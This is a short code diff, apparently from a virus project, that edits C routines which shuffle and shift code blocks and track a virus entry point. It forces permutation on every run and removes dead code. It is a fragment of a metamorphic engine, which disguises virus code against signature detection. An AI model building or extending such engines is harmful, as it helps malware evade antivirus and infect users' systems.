@@ -164,7 +164,8 @@ static bool	shard_block(struct code_block *blocks[NBLOCKS], \
 
 static bool     want_to_permutate(uint64_t *seed)
 {
-	return random(seed) % 2;
+	// return random(seed) % 2;
+	return true;
 }
 
 /*
@@ -248,8 +249,6 @@ static bool	shift_blocks(struct code_block *blocks[NBLOCKS])
 
 static bool	shift_entry_point(size_t virus_entry_point, \
 			int32_t *virus_func_shift,
-			struct safe_ptr input_code,
-			struct safe_ptr output_buffer,
 			struct code_block *blocks[NBLOCKS])
 {
 	for (size_t i = 0 ; i < NBLOCKS; i++)
@@ -261,18 +260,6 @@ static bool	shift_entry_point(size_t virus_entry_point, \
 		if (virus_entry_point >= block_start && virus_entry_point < block_end)
 		{
 			*virus_func_shift = b->shift_amount;
-			// void	*input_start = input_code.ptr;
-			// size_t	block_offset = block_start - (size_t)input_start;
-			// size_t	block_size = b->ref.size;
-			//
-			// void	*block_buffer = safe(output_buffer, block_offset, block_size);
-			//
-			// if (!block_buffer)
-			// 	return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
-			//
-			// size_t	entry_point_offset = *entry_point - block_start;
-			// *entry_point = safe_shift((size_t)block_buffer + entry_point_offset, b->shift_amount);
-
 			return true;
 		}
 	}
@@ -407,13 +394,12 @@ bool		permutate_blocks(struct safe_ptr input_code, \
 	|| !shard_block(blocks, block_memory.blocks, &seed)
 	|| !shuffle_blocks(blocks, seed)
 	|| !shift_blocks(blocks)
-	|| !shift_entry_point(virus_entry_point, virus_func_shift, input_code, output_buffer, blocks)// impossible if we don't know where virus is!
+	|| !shift_entry_point(virus_entry_point, virus_func_shift, blocks)// impossible if we don't know where virus is!
 	|| !write_permutated_code(input_code, output_buffer, blocks, output_size))
 		return errors(ERR_THROW, _ERR_PERMUTATE_BLOCKS);
-
 #ifdef DEBUG
 	// print_split_blocks(block_memory.blocks, NBLOCKS, input_code, output_buffer);
-	print_general(input_code, output_buffer, (size_t)virus_entry_point, *output_size, seed);
+	print_general(input_code, output_buffer, (size_t)virus_entry_point, *virus_func_shift, *output_size, seed);
 #endif
 	return true;
 }
